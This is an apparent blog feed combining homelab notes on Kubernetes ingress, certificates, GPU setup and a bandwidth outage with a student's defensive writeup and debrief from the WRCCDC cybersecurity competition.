<p>Although, one irritating I have noticed is that the model download doesn’t continue if I close the tab. I must leave the tab open for the model download to complete, despite the fact that the download is handled by ollama and doesn’t depend on anything from my browser session. Thankfully, it seems to save partial progress and does restore when I start it up.</p>
<p>I’m also interested in the new-ish <a href="https://ollama.com/library/embeddinggemma:300m">embeddinggemma:300m</a> model.</p>
</section>

<section id="ingress-nginx" class="level2">
<h2 class="anchored" data-anchor-id="ingress-nginx">Ingress-Nginx</h2>
<p>Okay, I thought I was done configuring Ingress-Nginx, until I logged into my Authentik and saw that all the logins appeared to be coming from the IP address of my host machine rather than the actual client IP of people who are connecting.</p>
<p>Fiddling with it a little, I found an issue relevant to my setup: <a href="https://github.com/k3s-io/klipper-lb/issues/31" class="uri">https://github.com/k3s-io/klipper-lb/issues/31</a></p>
<p>Another relevant discussion: <a href="https://github.com/k3s-io/k3s/discussions/2997#discussioncomment-1617536" class="uri">https://github.com/k3s-io/k3s/discussions/2997#discussioncomment-1617536</a></p>
<p>It turns that out klipper, the k3s inbuilt load balancer, does not forward the real client ips to services.</p>
<p>So, the main way people get around this is <a href="https://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/#preserving-the-client-source-ip">externaltrafficpolicy</a>, which probably works fine for my usecase, but the problem is tha in th real world, it risks imbalanced load balancing, which is why I’m trying to figure out how to get around it.</p>
<p>So I’m playing around with a few options:</p>
<ul>
<li>Externaltrafficpolicy</li>
<li>Loadbalancer
<ul>
<li>Klipper doesn’t wrk for reasons mentioned above</li>
<li><a href="https://kubernetes.github.io/ingress-nginx/deploy/baremetal/#a-pure-software-solution-metallb">Ingress-nginx docs confirm that MetalLB cannot reuse the host’s ip address or one’s assigned by dhcp</a>.</li>
</ul></li>
<li>Nodeport
<ul>
<li>It looks like <a href="https://kubernetes.github.io/ingress-nginx/deploy/baremetal/#source-ip-address">nodeport still doesn’t preserve the original source ip address</a>, unless you set externaltrafficpolicy to local</li>
</ul></li>
<li>hostport (ingress-nginx helm chart option where it exposes a port instead)</li>
<li>Hostnetwork.</li>
</ul>
<p>And now TLS doesn’t work, even if I switch back to load balancer.</p>
<p>First I’m trying hostport.</p>
<p><code>Deployment in version "v1" cannot be handled as a Deployment: json: cannot unmarshal string into Go struct field PodSpec.spec.template.spec.hostNetwork of type bool</code></p>
<p>Okay. I’ve tried hostport, nodeport, and externaltrafficpolicy. They all have this issue where I cannot actually access the proxied services on the subdomain, but instead it just takes me to my blg instance I hosted (that I never set up ssl for).</p>
<p>But, even after I switch back to the default setup, I am still encountering this issue.</p>
<pre><code>[moonpie@osiris flux-config]$ kubectl get service -A
NAMESPACE       NAME                                    TYPE           CLUSTER-IP      EXTERNAL-IP        PORT(S)                      AGE
blog            blog-nginx                              LoadBalancer   10.43.227.101   130.166.79.34      80:31748/TCP,443:31264/TCP   65d</code></pre>
<p>Much content ommited. But, it looks like my blog attempted to eat my main ingress ports. Okay, it looks like Bitnami’s nginx was creating a Loadbalancer service. I considered changing the ports it served on (there doesn’t appear to be a built in option to disable the service), but I wanted to learn how to patch helm charts so I did something else.</p>

<p>And with this, there is no more loadbalancer service created.</p>
<p>Oh, and it turns out that coder also creates a loadbalancer service, but thankfully there is a build in option, to change it to ClusterIP, since the ingress coder creates still wants to look at the service.</p>
<p>And yeah. Now, wien I sign in to Authentik, the actual ip address of the users who log in shows up.</p>
<p>Next up is to enable port 22 for the deployment. In addition to this, I also had to change the deployment strategy, otherwise the pods would not recreate.</p>

<p>The problem is that when I attempt to do a helm upgrade, one of the deployment pods will not be deleted. But, that pod binds ports. So because the pod is never deleted, the new pod can never be created (because I am on a single node).</p>
<p>The other bit I added was opening port 22 so I can use a <a href="https://kubernetes.github.io/ingress-nginx/user-guide/exposing-tcp-udp-services/">tcpserver</a> to expose the Forgejo SSH service.</p>
<p>Okay. I patch the deployment of ingress-nginx and I get this error:</p>

<p>I don’t think the ssh server is already in use, because I can run services using port 22. But Kubernetes refuses to schedule pods that use that port. It could be that it’s actually the other ports that are having issues:</p>

<p>With this “strategy”, the pods will be scaled down, but only to a certain amount… but I only have ONE pod. So it doesn’t get scaled down at all, and the new pod is never able to scale up to replace it. So these settings must be changed.</p>
<p>But once this is done, I can patch the deployment to have extra ports going through:</p>

<p>And then I can forward the tcp service via the ingress nginx controller, by following the <a href="https://kubernetes.github.io/ingress-nginx/user-guide/exposing-tcp-udp-services/">ingress-nginx docs on this</a>.</p>
<p><a href="https://www.reddit.com/r/kubernetes/comments/1n5bypk/tcp_external_load_balancer_nodeport_and_istio/">Related reddit post</a>. It seems like even Istio has stimilar issues.</p>
<p>Another issue I encountered was “413 Request Entity Too Large” when trying to upload ISO’s to nginx. By default, nginx has a setting, <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client.max_body_size</a> that limits the size of client requests, or in this case, the size of ISO’s that I can upload to Incus. To fix, you can add <a href="https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#custom-max-body-size">annotation that changes this setting</a>.</p>

<section id="cert-manager" class="level2">
<h2 class="anchored" data-anchor-id="cert-manager">Cert-Manager</h2>
<p>I also didn’t think I would need to revisit cert-manager either. But for Coder, it needs a wildcard certificate for the service to deploy, and if you want a wildcard cert you need to use the DNS01 resolver, rather than the http01 one I am currently using.</p>
<p>I found a <a href="https://github.com/lost-woods/cert-manager-porkbun-webhook">fork of a mainted cert-manager webhook that does nothing but add an OCI helm repo</a>. Nice!</p>
<p>But it 403’s unless I pull by a specific tag, 1.03. In order for OCI support to work for this, I need to udpate flux, as flux 2.6 offers the OciRepository CRD in the official api (rather than just in the beta api). However, even after updating flux, these api’s still remain in beta.</p>
<p>Okay after waiting for a bit, it’s there. Sometimes the solution is patience.</p>
<p>But I decide to switch to the <a href="https://github.com/mdonoughe/porkbun-webhook">original version</a> instead, after realizing that I can use a GitRepository to get the helm chart, and deploy the helm chart from a path in the git repository.</p>

</div>
<p><code>apt install nvidia-driver firmware-misc-nonfree</code></p>
<p>Anyway, next is to install the Nvidia container toolkit, using the nvidia repo, and <a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html">instructions from here</a>.</p>
<p><code>curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg</code></p>

</div>
<p><code>apt update</code></p>
<p><code>apt install nvidia-container-toolkit</code></p>
<p>After this, I simply restart the rke2 service, and it the nvidia container runtime is autodetected and shows up in the <code>/var/lib/rancher/rke2/agent/etc/containerd/config.toml</code> file.</p>
<p>After this, I should be able to simply set nvidia as a runtime for certain pods, according to the <a href="https://docs.k3s.io/advanced?_highlight=nvidia#alternative-container-runtime-support">k3s docs</a>.</p>
<p>Another common step for Nvidia support in Kubernetes, is to install the <a href="https://github.com/NVIDIA/k8s-device-plugin">Nvidia K8s device plugin</a>, but this requires the Nvidia container runtime to be teh <em>default</em>. I don’t want this, because it gives services that don’t need an Nvidia GPU access to Nvidia GPU’s. I don’t think I need this, however, so I won’t bother.</p>

<p>One of my current frustrations is that Autehntik is not fully GitOps right now, and instead I am configuring it through the UI. But authentik has a <a href="https://registry.terraform.io/providers/goauthentik/authentik/latest/docs">terraform provider</a> which, when combined with this Flux OpenTofu setup, would allow me to GitOps the authentik config as well.</p>
<p>Another option, now built in to authentik is <a href="https://docs.goauthentik.io/docs/customize/blueprints/">authentik blueprints</a>, which work with just the helm chart.</p>

<p>Kamaji is a virtual cluster setup, but unlike the similar vcluster, it seems to allow for different CNI’s to be used in tenant clusters. I think this could be usefult o deploy openstack, openshift, or harvester, inside my actual cluster, in such a way that it doesn’t break my existing configuration.</p>

<li>Have my Identity Management/Provider be hosted on idp.domainname, instead of sso.moonpiedumpl.ing</li>
<li>Have secrets be set up in such a way that people can copy the configs with minimal effort.</li>
<li>Use more than one kustomization instead of one big one
<ul>
<li>I edited the file that says “do not edit”</li>
<li>Kustomizations would let me do variable substitutions from secrets, allowing me to have things like the database password be private, but the url be public. Currently, I hide the entire database url (it includes the password).</li>
</ul></li>
</ul>
<p>One thing I am considering is using <a href="https://zitadel.com/">Zitadel</a> instead of authentik, because Zitadel supports <a href="https://zitadel.com/docs/apis/actions/introduction">actions</a> which are arbitrary scripts and probably cleaner to do than hacking an authentik policy to do api calls and requests.</p>
<p>But, Zitadel doesn’t seem to supply something akin to authentik blueprints. Also, it seems to be more designed for developers</p>
<p><a href="https://cloudnative-pg.io/">Cloud Native Postgres</a> is an operator that deploys postgres that is capable of <a href="https://cloudnative-pg.io/documentation/1.26/postgres_upgrades/#offline-in-place-major-upgrades">automatically handling major version upgrades</a>, which would let me dodge the issue I encountered with Authentik’s database upgrade. Although I don’t know if it’s truly automatic, given that it explicitly mentions that this happens if you mention a version number.</p>
<p>During a redeploy, I could either create multiple postgres “clusters” (I would still only be on a single node), or one big one with multiple dataabases.</p>
<p><a href="https://github.com/renovatebot/renovate">Renovate</a> or a similar software could automatically handle updating version tags, like those of helm charts or the postgres databases mentioned above.</p>
<p><a href="https://istio.io/latest/docs/">Lstio</a> is a service mesh and ingress alternative, and the feature I am interested in is mTLS encryption of trafffic between pods in the cluster. Given the way that I give people access to the inside of the kubernetes cluster via Coder containers, it’s worth investigating security measures like this, even if it requires more privileges than Coder users should have access to.</p>
<p>Lstio also offers a <a href="https://gateway-api.sigs.k8s.io/implementations/">Gateway API</a> which is the new hotness that will be replacing the Ingress controller in the future.</p>
<p>Another thing I can consider, is given my issues with load balancers and klipper-lb above, I could set up a real or virtual router to put my kubernetes behind, and have use MetalLB or some other solution that wants me to manage the network instead.</p>
<p>Also, I would probably rather use Cilium or Calico instead of RKE2’s combo of Flannel and Calico. I would want an eBPF data plane, and then I could use Cilium or Calico as host firewalls for blocking ssh and the kube api.</p>
<p>Other things to consider are options for improving security.</p>
<ul>
<li>Kube Api and ssh behind the firewall, requiring me to VPN into the server to access those services.</li>
<li>Some form of login banner/warning banner. If I’m going to be essentially becoming my own hosting provider/infra, it makes sense to have the legal protections in place.s</li>
</ul>
<p>Openstack instead of Incus. Incus is really good, but there are so many papercuts and issues when using it that are frustrating. I originally wanted Openstack because it was a whole “cloud” and had features like s3, databases as a service, firewall as a service, containers as a service, etc. But on the reddit, people are frustrated with those services as they aren’t maintained and truly reliable the way that the core openstack set of components is — for example, <a href="https://www.reddit.com/r/openstack/comments/1lelavr/is_openstack_zun_still_maintained_and_used/mywdhnj/">zun (containers) was deprecated and then undeprecated</a>.</p>
<p>Despite that, the core Openstack components are extremely mature, with bugs ironed out, and features that Incus is lacking like the ability to create more complex networks via the UI. I totally understand why, as there isn’t really a reason to deploy pfsense when Incus’s ACL’s and build in monitoring can cover that use case in the real world, but for an educational use case it’s nice for people to be able to deploy virtual firewalls.</p>
<p>My big concern is attempting to get ceph on a single node. Instead of using openstack helm, I am thinking of using <a href="https://openstack-k8s-operators.github.io/openstack-operator/">Openstack Operators</a> (which are actually the upstream of Red Hat Openstack on Kube although they don’t tell you). However, it seems to <a href="https://docs.redhat.com/en/documentation/red_hat_openstack_services_on_openshift/18.0/html/deploying_red_hat_openstack_services_on_openshift/assembly_installing-and-preparing-the-operators#prerequisites">be much simpler with Red Hat Openshift</a> than if I were to deploy without it, and perhaps it’s not even possible to deploy on a non-openshift platform.</p>
<p>But after investigating, it does look pretty gitops-able, where I should be able to take the data from <a href="https://github.com/openstack-k8s-operators/openstack-operator/tree/main/config">the config direcotry</a> and deploy that using GitOps. It also looks like I can select abitrary storage classes, instead of being locked to ceph. One disadvantage is that these operators don’t seem to support as many services as Openstack Helm, like there is no support for Zun or skyline.</p>
<p>Another operatore option is <a href="https://docs.yaook.cloud">yaook</a>, but also no support for Zun or Skyline. Also, <a href="https://www.reddit.com/r/openstack/comments/1cyrz3a/if_management_compelled_you_to_use_a/l5bjzmx/">one reddit user says that updating the operator is painful</a>. I’ll probably go with Red Hat’s offering, if it works.</p>
<p><a href="https://github.com/openstack-gitops/rhoso-gitops" class="uri">https://github.com/openstack-gitops/rhoso-gitops</a>. Huh. Officially developed Openstack on ArgoCD.</p>
<p>Another thing worth looking at is <a href="https://github.com/rackerlabs/genestack">genestack</a>, where they managed to get longhorn support with openstack-helm, but I could not figure out how they did it.</p>
<p>Another option is Suse Harvester… but they only officially support an ISO install. But I can find people unofficially nabbing the helm charts into their gitops:</p>
<ul>
<li><a href="https://github.com/chifu1234/flux/blob/9ad745fbb9924c318a27c641d81b71478d46f72d/apps/base/harvester/release.yaml#L13" class="uri">https://github.com/chifu1234/flux/blob/9ad745fbb9924c318a27c641d81b71478d46f72d/apps/base/harvester/release.yaml#L13</a></li>
<li><a href="https://github.com/remikeat/cluster/blob/3754e93b7d242ab384dac68e4206565e8ed9d6a5/argocd/vm/harvester/application.yaml#L4" class="uri">https://github.com/remikeat/cluster/blob/3754e93b7d242ab384dac68e4206565e8ed9d6a5/argocd/vm/harvester/application.yaml#L4</a></li>
</ul>
<p>Harvester does have a <a href="https://harvesterhci.io/development/dev-mode/">development mode install</a>, which documents using helm to install it.</p>
<p>I would have to deploy Rancher with the <a href="https://github.com/harvester/harvester-ui-extension">harvester UI extension</a>.</p>
<p>Argo instead of Flux: Probably not. But I am considering changing the way flux is deployed, like using the flux operator instead.</p>
<p>One thing I really, really want to do is get my own ASN and become my own hosting platform. But this is a far future type thing.</p>

<h1>Incident: Outage</h1>
<p>I was informed by a user of my services, that Incus has been taken slow to load, and generally broken. It was when I attempted to ssh into the server, and my connection was booted, that I became concerned.</p>
<p>My first theory was that it was a DDOS attack of some kind.</p>

<p>This is the result of <code>iftop</code>, which shows network traffic. Most of these seem to be scraper bots of some kind, and they are eating up my traffic.</p>
<p>I deployed anubis to my forgejo service, to avoid overconsumption of CPU, but I neglected another problem: With a total of only 200 mb/s, it could easily get saturated, even by simpler requests.</p>
<p>Here is an example domain that affected me: <code>azpdegt2l5yb.stretchoid.com</code>. This site, stretchoid, is as port scanning service, that scans websites for vulnerabilities. And they are eating up all my bandwidth, in what is essentially a ddos attack. Similarly, <code>scan-13f.shadowserver.org</code> belongs to a port scanning as a service platform.</p>
<p>Although I thought I was being clever with my bonding setup, the problem with it, is that even though I get more performance out of it, it becomes possible to saturate both network interfaces via enough connections. If I was using a seperate “management” interface, that was not exposed publicly except for ssh, then it could not get saturated, enabling me to reliably connect.</p>
<p>Another unlucky thing: This happened exactly when I went back to San Diego. I am not currently physically with my server to handle things if I want to take it truly offline.</p>
<p>The temporary mitigation I have implemented to ensure continued remote access (albeit, at the cost of uptime):</p>
<ul>
<li>Taking my services offline (just stopping the systemd services)</li>
<li>Pointing moonpiedumpl.ing to 1.1.1.1 instead of my original domain
<ul>
<li>This does not seem to have stopped the scanners though</li>
</ul></li>
</ul>
<p>After my services have been offline for a while, the traffic seems to have slowed. Although <code>iftop</code> still reports many connections, I’m not seeing a constant 90 mbit/s all the time.</p>
<p>Possible temporary solutions (which keep my services online):</p>
<ul>
<li>Change my mac address (in order to get a different one from DHCP)
<ul>
<li>This may not work if they are scanning domains</li>
<li>This may not work if they are scanning the whole internet, and just happened to find me. If they can find me once, they can find me again.</li>
</ul></li>
<li>Change my domain
<ul>
<li>Yeah. Same thing as above. Perhaps changing my domain, along with my ip address will let me keep my service up.</li>
</ul></li>
</ul>
<p>Possible long term solutions:</p>
<ul>
<li>Ip based blocklists
<ul>
<li>Something like crowdsec could block ip addresses… although I’m worried they</li>
</ul></li>
<li>Cloudfare
<ul>
<li>Maybe one of the cloudfare ingress controllers:
<ul>
<li><a href="https://github.com/STRRL/cloudflare-tunnel-ingress-controller" class="uri">https://github.com/STRRL/cloudflare-tunnel-ingress-controller</a></li>
<li><a href="https://blog.cloudflare.com/cloudflare-ingress-controller/" class="uri">https://blog.cloudflare.com/cloudflare-ingress-controller/</a></li>
</ul></li>
</ul></li>
<li>VPS + Reverse Proxy (+ WAF?)
<ul>
<li>Something like <a href="https://github.com/fosrl/pangolin">pangolin</a></li>
</ul></li>
</ul>
<p>Okay, I will say that I have been forced to change my ip address, because I moved from one dorm to another. So now, I am debating if I should change my domain or not. I think I will change it and keep the new one secret, using variables like</p>
<p>One thing I think would be cool would are <a href="https://letsencrypt.org/2025/01/16/6-day-and-ip-certs">letsencrypt’s ip address based certificates</a>, but I think Coder needs subdomains in order to work, and I can’t have a subdomain on an ip address. But with something like this, I could just move my ip address and keep going.</p>
<p>I could also consider just… not changing my domain. This service needs to be up by tomorrow, which is not a lot of time. But if I do so, then I risk exposing my new IP address and domain.</p>
<p>In order to test this, I connected my laptop (so I got a different IP address) and pointed my domain to my laptop. Although I see a lot of port scans, I don’t see any major usage of traffic. I suspect that attempts to pop open forgejo, in combination with Incus doing something like Image pulling, ate up all my traffic. I think I’m just going to put this online as is, and if I see too much traffic, I can put the entirity of forgejo behind a login wall.</p>
<p>However, after putting my server back up, I see Incus eating up around 80-90 mbit/s of bandwidth. The connection is to <code>images.linuxcontainers.org</code>, which is where the images are stored. Apparently, Incus auto updating cached images was eating up all my network. Thankfully, I can disable the feature.</p>
<p>So it’s not <em>quite</em> a DDOS. But I was able to access the server while forgejo was offline, even with that high bandwidth usage, so I think it was a double whammy, and a combination of the two resulted in a much worse problem.</p>
<p>I saw almost no traffic, but when I put forgejo online again, I saw a lot more traffic and port scanners. Not DDOS, but I guess it was enough to fill up my network when combined with Incus. The way bonding works, is that the it doesn’t split a single connection, so individual connections are limited. Hence why it’s a “Distributed” Denial of Service, instead of a just a normal machine.</p>

<p>Except, I’m not quite sure there is no issue. Despite seeing no network traffic from Incus or scanners on forgejo, the server still suffered from intermittment connections. But, apparently the new building I am, has bad wiring and issues, according to someone else who was previously here. In addition to that, my dorm has the wifi router. My guess is what is happening is that despite having 100 mbit/s connection limits on all cables, the switch behind everything (or something further up the chain), cannot actualloy handle all that traffic. I’m reminded of a <a href="https://home.robusta.dev/blog/stop-using-cpu-limits">blog post I recently read about cpu limits on kubernetes</a>, where they note that setting a CPU limit does not actually guarantee that pods will get access to that level of CPU. Instead, requests are needed, which actually does do the work to figure out a setup where all pods get the cpu they request.</p>
<p>And it’s really bad.</p>
<p>I switched to <a href="https://github.com/mobile-shell/mosh">mosh</a>, and despite no traffic running through my server except ssh, I see this:</p>

Eventually it reconnects. But this is really annoying. And for users, it must be extra annoying. But first, I need to ensure that both my ethernet interfaces in the bond are actually being used.

<p>The <code>Link Failure Count: 1</code> is probably due to me unplugging it to plug my laptop in, but it did come back up again, which is a good sign.</p>

<p>So it looks like despite having a bond, only one of my interfaces is actually used. Both say up though, but this probably contributes to not getting enough network speeds.</p>

  <title>WRCCDC Regionals Writeup</title>
  <link>./writeups/wrccdc/</link>
  <description><![CDATA[ 





<p>This is a writeup for the WRCCDC regionals. As some context, <a href="https://wrccdc.org/">WRCCDC</a> is a cybersecurity competition that involves managing an environment that is a simulation of a real company, while being hit by a cyberattack from competition organizers referred to as “red teamers”.</p>
<p>It’s stressful. It’s chaotic. But it’s great fun.</p>
<p>Vocab glossary (but I won’t cover non-competition specific stuff):</p>
<ul>
<li>Scoring engine: Software that automatically connects, and authenticates to scored services, and “scores” them for being up</li>
<li>Scored service: A service that is being checked by the scoring engine — not all services are.</li>
<li>Injects: Writeups of tasks we are assigned to do</li>
<li>Teams: Subsets of the competition organizers, volunteers responsible for making the game work
<ul>
<li>Red Team: <strong>Competition Organizers</strong> who pretend to be cyberattackers by slowly infiltrating machines they could instantly destroy but instead choose not to</li>
<li>Orange Team: Pretends to be customers</li>
<li>White Team: Grades Injects</li>
<li>Black (Ops/Operations) Team: Sets up the environment</li>
<li>Gold Team: Organizional duties</li>
</ul></li>
<li>Team packet: Document noting down the topology, some scored services, and rules of the competition.</li>
<li>Incident responses: Documents noting down how a cyberattack happened, affected services and data, and mitigation steps.</li>
</ul>
<section id="writeup" class="level1">
<h1>Writeup</h1>
<section id="topology" class="level2">
<h2 class="anchored" data-anchor-id="topology">Topology</h2>
<p>I began with two nmap scans of the entire environment, to see what was on the network.</p>
<ul>
<li><a href="./pastes/220nmap.txt">Nmap scan 1</a> (public environment, physical machines)</li>
<li><a href="./pastes/230nmap.txt">Nmap scan 2</a> (“cloud” environment/VM’s)</li>
</ul>
<p>There was also one more environment, which was the partially airgapped one, which I did not nmap.</p>
<p>The topolgy was very complex, there were 3 environments in total, one “cloud” environment hosted on vcenter, and two physical environments, one of which was airgapped.</p>
<p><img src="./writeups/wrccdc/images/topologyfinal2025.webp" class="img-fluid"></p>
</section>
<section id="work" class="level2">
<h2 class="anchored" data-anchor-id="work">Work</h2>
<p>There weren’t enough physical machines at first. We started out with 3 workstations that had input working and internet access, and then later pushed it up to 5. What we should have probably done is deploy a proxy of some sort on the device in between the airgapped network and the main network (scully), and then used that to get internet access on more of the workstations. But because we didn’t know if it was acceptable, we didn’t do it.</p>
<p>I firstly logged into the <em>laptop</em> with the hostname “Bishop41”. The machine ran something <a href="https://winuxos.com/">Winux</a>, which is essentially Ubuntu with KDE, heavily themed to look like Windows. There was also <a href="https://linuxfx.org/">LinuxFX</a>, which was something similar. I liked them at first, I thought they were cool Windows clones that I could give to my mother so I could help her escape Windows, without her noticing, but the KDE UI kept crashing.</p>
<p>Thankfully, I have experience from my personal laptop:</p>
<p><code>systemctl --user restart plasma-plasmashell</code> (without sudo). The jokes is that KDE “<em>Krashes</em>” a lot.</p>
<p>Firstly, I had to change the dns at <code>/etc/resolv.conf</code>. It was originally marked immutable, so I had to unmark it with <code>chattr -i /etc/resolv.conf</code> in order to be able to edit, even as a root user.</p>
<p>Bishop41 had some malware on it that was fairly easy to find… but I didn’t find the later bits until after I had to do the presentation. The presentation: <a href="./kitty_presentation">presentation html link</a></p>
<p>Of course, I elaborated on the points in the presentation, since the slides are somewhat information sparse. For example, I broke down how the reverse shell worked, pointing to the bits of the python code that bound to a port, or ran the bash process.</p>
<p>And, I was also wrong about the reverse shell not being running. It was <code>:(</code>. I later found that there was a cronjob, either added by red teamers or black teamers</p>
<p>There was also another piece of dangerous software I missed, a web service that had an interface to submit python code that would run on the machine. Not quite malware, but it wasn’t a scored service. I removed it, as it was serving on port 80, which interfered when I attempted to up the <code>apache2</code> service.</p>
<p>I did find something interesting in the apache2.</p>

<p>I’m pretty sure /usr/share <em>isn’t</em> supposed to be publicly accessible on the web. Thankfully, this seems to be read only access.</p>
<p>I also did a later presentation on a software, <a href="https://arkime.com/">Arkime</a>. I did not manage to get it deployed, and my presentation overview was very short. However, after my presentation, they asked me many questions about PCAP’s, encryption, and other network analysis things, and I answered them pretty well. At the mixer that night, the person who quizzed me complimented me and told me that they were searching for specific keywords for the presentation.</p>
<p>Bishop41 also had a live, scored service that was a “python web environment”. An orange teamer actually came and in to (attempt to) use it to learn how to reverse an array. But that software was essentially a permanent security hole, as it could run arbitrary python on the machine as root.</p>
<p>We had trouble with docker on the Scully machine, it would time out when attempting to pull images. I never figured it out. It could ping, but it could not curl or install packages. Until it could for a bit. Then it stopped working again. And yes, DNS on the machine was working.</p>
<p>Later on, it got owned and some red teams claimed the bootloader was replaced with Nyan cat — although I did not see this one in person.</p>
<p>For the router, bologna (how is that pronounced?), it got owned later on. It was an alpine router.</p>

<span id="cb2-22">│ * Stopping shellinaboxd ... </span></code></pre></div>
<p><a href="https://github.com/shellinabox/shellinabox">Shellinabox</a> is a small web service that lets you run shell commands via browser interface. Essentially a backdoor.</p>
<p>In addition to this, when bologna was pwned, the <code>.profile</code> file, which the <code>ash</code> shell seems to run when it started up, was set to play a very long “video” via a program called asciicinema, which basically plays videos in the terminal.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">bologna:~# cat .profile </span>
<span id="cb3-2">#!/bin/sh</span>
<span id="cb3-3">asciinema play /.demo.rec</span></code></pre></div>
<p>And then this would play a very long simulation of the machine getting hacked. To exit, I would hit Ctrl+C and then type <code>exit</code>, and then spam Ctrl + Z or Ctrl + D to quit. Painful, but I found zellij wouldn’t rerun this when starting. It was also persistent, it stayed even after I deleted the .profile file. (Oh. I probably should have just edited it to remove the “asciinema play” bit).</p>
<p>Later through the competition, we started using cryptpad on a public instance. We used a link shortener to make it easier to access. We had a spreadsheet for inventory and passwords.</p>

<section id="injects" class="level2">
<h2 class="anchored" data-anchor-id="injects">Injects</h2>
<p>We also had a lot of trouble with the Kubernetes cluster. Before Orange team came in and took it, a <a href="./files/drplan.txt">Disaster Recovery Plan</a>. This documented how to migrate the services from one kubernetes cluster to another, but we did not do this.</p>
<p>There were some other injects that would have been helpful to us. For example, one inject was to set up a way to transfer data from high side to low side by setting up <a href="https://nifi.apache.org/">Apache Nifi</a>. That would have been legitimately useful to transfer stuff from low side to high side.</p>
<p>There was also an ansible inject, which required the creation of 3 playbooks that would collect: Disk space, network interfaces, and system services running. We then had to run those playbooks on 10 machines.</p>

<h2 class="anchored" data-anchor-id="final-scores-and-future-plans">Final Scores and Future Plans</h2>
<p><img src="./writeups/wrccdc/images/scores.webp" class="img-fluid"></p>
<p>We only had a single person who had been to regionals before, and our previous Windows and Linux team leads were no longer on the team. We lost a ton of knowledge, both the raw technical knowledge, but also the passed down knowledge about the competition, like what is acceptable, and what compromises are okay in terms of scoring.</p>
<p>I always expected last place. We were woefully underprepared, not having expected to make it to regionals — So we had all split up and began working on our own stuff (I was working on Openstack so I could have a remote lab for people <em>next year</em>), and we were suprised when the announcment about Regionals came out. And then we had to get back together and prepare for one of the harder regions of CCDC in less than 2 months, while our entire team consisted of 9 active members.</p>
<p>Like when I play chess against a vastly better player, my goal was never to win, but instead to <em>not lose instantly</em>. And we did.</p>
<p><img src="./writeups/wrccdc/images/graph.jpg" class="img-fluid"></p>
<p>I’m very pleased with our performance. Despite setting the low goal of not losing instantly, sometimes not even that is achievable, which sucks. But we managed to mostly hold ourselves together for the first half of the first day, and we managed to learn a lot.</p>
<p>Since we are effectively starting from scratch, it’s important that we record all the stuff we are missing so we can fix these issues. This is why I have this writeup. I will probaly turn the “Things to do” into a Kanban of some kind and we will knock them out one by one over the off season.</p>

<section id="debrief-notes" class="level1">
<h1>Debrief Notes</h1>
<p>Brandon/<code>@ProBro</code></p>
<ul>
<li>Much of the stuff was set up in the week before competition.</li>
</ul>
<p>Ops team debrief by Wasabi:</p>
<ul>
<li>One of the largest topologies ever, 3 networks connected by vpn or something else.</li>
<li>Scully router was too secure, stopping traffic to the phones.</li>
<li>Most custom services ever. Some of it was written hours before competition start. Satellite control system, written in 4 hours. A few chatbots. OTP service could get hijacked by red team by changing the seed.</li>
<li>Red hat was doing wireless hacking and jamming antennae…</li>
<li>CVE’s were dropped for non ccdc-specific services.</li>
<li>We are not allowed to unplug EVERYTHING. Like the coastline college environment, or the magic box. One team shut that down and their scoring stopped working</li>
<li>Red team would deny outbound dns traffic to break dns. Red team would also drop udp traffic but not tcp, so ssh would still be allowed.</li>
<li>some teams used the site to site vpn to connect to all networks.</li>
<li>Teams should really do an inventory, especially <em>how</em> things are connected, not just what.</li>
<li>Only 90 tickets, half of qualifiers. Teams got a lot of poinrs back from ticketing from ops team errors.</li>
<li>8 custom apps, some had CVE’s reported in them.</li>
<li>Deployment for each pod went from 2 hours for a team to 30 minutes when they were setting up environments.</li>
<li>Changes from Qualifiers:
<ul>
<li>teams coordinated, red team and ops team talked to eachother. Ops team had a sheet with red team plans. They used this to guess if an issue was red team related.</li>
<li>Environment was much more tested.</li>
</ul></li>
<li>NUCC (nonprofit that provides software) provided unifi gear, and they will peovide it if we ask.
<ul>
<li>I met the owner, he goes to SFVGlug sometimes. He offered to lend us network hardware.</li>
</ul></li>
<li>Vcenter crashed.</li>
<li>Slow =/= not working. Many teams complained, saying something that was not working when really it was just slow.</li>
<li>Windows licenses sometimes needed to be reactivated <code>slmgr /rearm</code></li>
<li>Printers would instantly distract a few people from every team. I hope the vid is put on youtube, it’s hilarious.</li>
<li>A couple hours before the taking of the kubernetes machine there was a disaster recovery sent out. Only 4 teams recovered from that. Also red team was taking advantage of that distraction to break into people’s machines.</li>
<li>Old switch was a dhcp server, but unifi needs dhcp to get set up</li>
<li>Inter Laptop
<ul>
<li>A lot of malware</li>
<li>Web based python development environment</li>
<li>was supposed to be hiding the domain controller by resting on top of the machine (in our env we received a broken monitor, although we were not supposed to receive a monitor at all)</li>
<li>had a unifi switch controller preinstalled, for setting up the new unifi</li>
</ul></li>
<li>20-30 in person volunteers, 5 remote for ops team.</li>
<li>300 physical systems and 200 virtual machines.</li>
<li>Ask clovismint for info about services.</li>
<li>Beesad validates tickets after the event, to give points back. Thanks Beesad!</li>
</ul>
<p>Orange Team Debrief:</p>
<ul>
<li>Orange team was also black team…</li>
<li>Orange team scoring: 40% was phone answers, 30% was services, 30% was customer service</li>
<li>Commonly missed: not answering the phone, hanging up, or not calling us back</li>
<li>People blocked orange team’s vpn clients into high side</li>
<li>They will call and tell if a service is down, and they track callbacks on a sheet. You get full points if you fix the service and call back.</li>
<li>Radio check. Only one team changed the frequency. Interrogation.</li>
</ul>
<p>White Team Debrief:</p>
<ul>
<li>Does all injects and grading</li>
<li>They had a schedule for the injects, to ensure that there was always at least 2 injects except at the beginning or end of the day. They also worked with black and orange team, arranging these. Announcements are also timed, such as the DR plan.</li>
<li>3500 items scored, by this morning. 45 seconds per item scored.</li>
<li>Some issues with some injects, like submitting an inject as an ODT renamed as a pdf, or same thing woth the wrong #.
<ul>
<li>Double check them</li>
</ul></li>
<li>Read the team packet…</li>
<li>A single link is not a substitute for documentation, especially for high side which doesn’t have internet.</li>
<li>The inject gave temporary permission for an inject to have data flow beyweem hi side and low side. This was probably the proxy inject, where we would have set up the proxy that gives internet access to hi side.</li>
<li>Easter eggs are funny and wake the inject graders up. They have very little sleep.</li>
<li>Infographics should be easy to read and print.</li>
